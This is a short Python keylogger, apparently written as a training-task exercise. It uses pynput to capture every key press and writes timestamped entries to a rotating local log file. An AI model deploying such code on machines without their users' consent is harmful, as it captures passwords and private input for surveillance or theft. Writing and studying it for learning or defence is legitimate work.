from pynput import keyboard
import logging
import os
from logging.handlers import RotatingFileHandler

path = r"D:\Prodigy Infotech\Task 4 Simple Keylogger\keylog.txt"

os.makedirs(os.path.dirname(path), exist_ok=True)

log_handler = RotatingFileHandler(path, maxBytes=1_000_000, backupCount=3)

logging.basicConfig(level=logging.DEBUG, format='%(asctime)s: %(message)s', handlers=[log_handler])

def on_press(key):
    try:
        logging.info(f'Key {key.char} pressed')
    except AttributeError:
        logging.info(f'Special Key {key} pressed')

def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

start_keylogger()